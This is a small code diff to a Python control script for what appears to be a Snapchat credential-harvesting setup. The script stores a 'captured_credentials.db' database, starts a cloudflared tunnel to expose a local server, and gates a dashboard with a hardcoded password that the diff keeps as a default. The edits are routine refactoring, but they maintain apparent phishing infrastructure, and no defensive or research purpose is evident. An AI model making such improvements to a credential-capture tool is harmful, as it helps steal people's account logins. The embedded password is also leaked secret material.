@@ -9,7 +9,7 @@ from datetime import datetime
 BASE = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE, "captured_credentials.db")
 CF_PATH = os.path.join(BASE, "cloudflared.exe")
-ACCESS_PW = "76247010aidafamoussa"
+ACCESS_PW = os.environ.get("SNAPCHAT_LAB_DASHBOARD_PW", "76247010aidafamoussa")
 
 sys.path.insert(0, BASE)
 
@@ -19,7 +19,7 @@ cf_url = None
 cf_proc = None
 
 def db():
-    return sqlite3.connect(DB_PATH)
+    return sqlite3.connect(DB_PATH, timeout=10)
 
 def cls():
     os.system("cls" if os.name == "nt" else "clear")
@@ -66,9 +66,9 @@ def start_server():
 
 def stop_server():
     try:
-        import requests
-        requests.post("http://127.0.0.1:5000/shutdown", timeout=2)
-    except:
+        import requests as _req
+        _req.post("http://127.0.0.1:5000/shutdown", timeout=2)
+    except Exception:
         pass
 
 def start_tunnel():
